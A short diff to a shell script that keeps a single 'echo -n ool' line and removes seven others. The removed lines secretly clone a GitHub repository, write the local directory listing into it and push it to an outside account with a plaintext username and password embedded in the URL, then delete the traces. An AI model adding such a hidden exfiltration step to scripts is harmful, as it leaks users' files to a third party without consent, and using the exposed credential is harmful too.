@@ -1,8 +1,1 @@
 echo -n ool
-git clone --q https://github.com/hbtnstuff/tests.git
-ls > tests/results
-cd tests
-git commit -q -a -m "u"
-git push -q 'https://hbtnstuff:s4turd4yh4ck4thon;@github.com/hbtnstuff/tests.git' master
-cd ..
-rm -rf tests
